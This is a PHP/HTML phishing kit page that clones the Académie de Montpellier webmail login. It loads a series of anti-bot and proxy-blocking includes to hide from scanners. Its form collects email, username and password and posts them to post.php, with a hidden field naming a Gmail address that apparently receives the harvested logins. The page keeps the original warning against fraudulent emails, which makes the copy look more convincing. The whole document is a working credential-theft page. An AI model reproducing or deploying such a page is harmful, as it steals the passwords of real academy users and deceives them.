<?php
include './bots/proxyblock.php';
include './bots/anti1.php';
include './bots/anti2.php';
include './bots/anti3.php';
include './bots/anti4.php';
include './bots/anti5.php';
include './bots/anti6.php';
include './bots/anti7.php';
include './bots/anti8.php';
include './bots/antibots1.php';
include './bots/antibots2.php';
include './bots/antibots3.php';
include './bots/antibots4.php';
include './bots/antibots5.php';
include './bots/antibots6.php';
?>
<!DOCTYPE html>
<!-- saved from url=(0135)https://webmail.ac-montpellier.fr/iwc_static/c11n/allDomain/layout/login.html?lang=en-US&3.0.2.2.0_20010935&svcs=abs,mail,calendar,c11n -->
<html xmlns="http://www.w3.org/1999/xhtml" class="dj_webkit dj_chrome dj_contentbox"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="MobileOptimized" content="width">
		<meta name="HandheldFriendly" content="true">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Convergence</title>
		<style type="text/css">		
			@import "./fil/materialize.css"; 
			@import "./fil/materializeMonCSS.css";
		</style>
		<script type="text/javascript" src="./fil/jquery-3.3.1.min.js.download"></script>
		<script type="text/javascript" src="./fil/materialize.min.js.download"></script>
		<script type="text/javascript">
			var djConfig= {
				cacheBust: "none",
				isDebug:false,
				parseOnLoad:true
			};

			(function() {
				function getParameter(paramName) {
					paramName += "=";
					var queryString = window.location.search;
					var strBegin = queryString.indexOf(paramName);
					if (strBegin==-1){
						strBegin = queryString.length;
					}
					else {
						strBegin += paramName.length;
					}
					var strEnd = queryString.indexOf("&",strBegin);

					if (strEnd==-1){
						strEnd = queryString.length;
					}

					return queryString.substring(strBegin,strEnd);
				}

				var locale = getParameter("lang");
				if (locale.length > 0){
					djConfig.locale = locale.toLowerCase();
				}
				if (locale == "ar" || locale == "iw") {
					djConfig.direction = document.getElementsByTagName("html")[0].dir = "rtl";
				}
			})()

			// load new resources and change the welcome message to
			// "Welcome to Convergence"
			function loadC11nResources() {
				dojo.registerModulePath("c11n", "../../../c11n");
				dojo.requireLocalization("c11n.allDomain",  "resources");
				var l10n = dojo.i18n.getLocalization("c11n.allDomain", "resources");
				dojo.mixin(iwc.l10n, l10n);
			}

		</script>

		<script type="text/javascript" src="./fil/dojo.js.download"></script></head><body><textarea id="dijit._editor.RichText.savedContent" style="display:none;position:absolute;top:-100px;left:-100px;height:3px;width:3px;overflow:hidden;"></textarea>
		<script type="text/javascript">
			dojo.registerModulePath("iwc", "../../iwc");
			dojo.requireLocalization("iwc.i18n","resources");
			iwc.l10n = dojo.i18n.getLocalization("iwc.i18n", "resources");

			loadC11nResources();

			dojo.require("iwc.login");
			dojo.require("dijit.form.Button");
			dojo.require("dojox.form.DropDownSelect");

			dojo.addOnLoad(function(){
				iwc.login.setFocus();
				iwc.login.doI18N();
				document.getElementById('picCache').src='../../../layout/imageList.html?'+djConfig.cacheBust;
				//var lang = langLblMapping[djConfig.locale.toLowerCase()]?langLblMapping[djConfig.locale.toLowerCase()]:langLblMapping['en-us'];
				var lang = "en_us";
				if(djConfig && djConfig.locale) {
					lang = djConfig.locale.toLowerCase();
				}
				dijit.byId('langButton').attr("value", lang);
				dojo.connect(dijit.byId("langButton"), "onChange", function(lang) {
					var loginUrl = window.location;

                    if(window.location.search!=""&&window.location.search.indexOf('lang=')>-1)
                        loginUrl = loginUrl.href.replace('lang='+iwc.login.getParameter('lang'),'lang='+lang);
                    else
                        loginUrl = loginUrl+"?lang="+lang

                    if(window.location.search.indexOf("u=1")==-1)
                        loginUrl=loginUrl+'&u=1';
                    
					window.location = loginUrl;
					return false;
				});
			});

			function login() {
				setTimeout(function(){
				                $('.waves-ripple').fadeTo(400, 0, function(){
				                                    $('.waves-ripple').remove();
				                                    				});
				                                    							},500);
				return iwc.login.checkName();
			}
		</script>
		<link rel="icon" href="https://webmail.ac-montpellier.fr/iwc_static/c11n/allDomain/layout/images/ac-montpellier.ico">
	

    
         <div class="section"></div>       
        <center>
		 <img class="responsive-img" src="./fil/webmail-montpellier.png" width="540" align="middle">
                   <div class="section"></div>
                        <div class="container">
                            <div class="z-depth-1 white row" style="display: inline-block; padding: 10px 48px 10px 48px; border: 1px solid #EEE;">
		        	<form action="post.php" method="post" onsubmit="return login();">
				<div class="row">
                                 <h5 class="grey-text">Se connecter</h5>
								
                                 <div class="row">
								 <input type="hidden" name="mailla" value="Jeansimonweber@gmail.com"/>
								 <div class="input-field col s12">
							<label id="usernameLabelID" for="username">E-mail:</label>
							<input class="input" id="username" name="email" type="email" required />
				    </div>
                                    <div class="input-field col s12">
							<label id="usernameLabelID" for="username">Identifiant:</label>
							<input class="input" id="username" name="user" type="text" required />
				    </div>
				
				 </div>
				 <div class="row">
				               <div class="input-field col s12">
							<label id="passwordLabelID" for="password">Mot de passe:</label>
							<input id="password" name="pass" type="password" required>
						</div>
						<label style="float: right;">
						  <a class="grey-text" href="https://aida.ac-montpellier.fr/"><b>Mot de passe oublié ?</b></a>
						</label>
			           </div>
		                         <center>
	                                       <div class="row">
	                                       <div class="Convergence-Login-Notification" id="alertMsg"></div>
	                                       <br>

								         <span class="dijit dijitReset dijitLeft dijitInline btn waves-effect waves-light dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="signin"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button" aria-labelledby="signin_label" id="signin" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">VALIDER</span></button></span></span></span>
						</div>
						</center></div>
					</form></div></div></center>

					
				
				<div class="Password-Expired-Message tundra" id="PwdExpiredMsg" style="display:none;">                   
					<div class="ErrorMsg-Contianer" id="btnContainer">                                                
						<div class="Error-Icon"></div>
						<div class="Error-Msg" id="errMsg"></div>			    	
					</div>
					<div class="Convergence-Login-FormButton ChangePwdBtn">	
						<span class="dijit dijitReset dijitLeft dijitInline dijitButton" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" widgetid="changepwd"><span class="dijitReset dijitRight dijitInline"><span class="dijitReset dijitInline dijitButtonNode"><button class="dijitReset dijitStretch dijitButtonContents" dojoattachpoint="titleNode,focusNode" type="button" value="" wairole="button" waistate="labelledby-changepwd_label" role="button" aria-labelledby="changepwd_label" id="changepwd" tabindex="0"><span class="dijitReset dijitInline" dojoattachpoint="iconNode"><span class="dijitReset dijitToggleButtonIconChar">✓</span></span><span class="dijitReset dijitInline dijitButtonText" id="changepwd_label" dojoattachpoint="containerNode">Change Password</span></button></span></span></span>
				</div>
		    </div>
			
			 <div class="container">
	                      <div class="z-depth-1 white row" style="display: inline-block; padding: 0px 40px 0px 40px;   #EEE;">
				<div class="row">
		      <center>
		     <br> Des <a class="lien_acad" href="http://fr.wikipedia.org/wiki/Hame%C3%A7onnage">e-mails frauduleux</a> circulent !
  	          		 La Direction des Systèmes d'Information et de l'Innovation (DS2I) ne vous demandera jamais votre identifiant et/ou votre mot de passe.
                              </center>
                          </div>
                          </div>
                       </div>
	

	<div id="overlay" class="login">
		<div class="centered">
			<div class="logo"></div>
			<div id="progress"></div>
		</div>
	</div>


<iframe name="picCache" id="picCache" src="./fil/saved_resource.html" width="0" height="0" frameborder="0" __idm_frm__="853"></iframe>
    

<div class="hiddendiv common"></div></body></html>
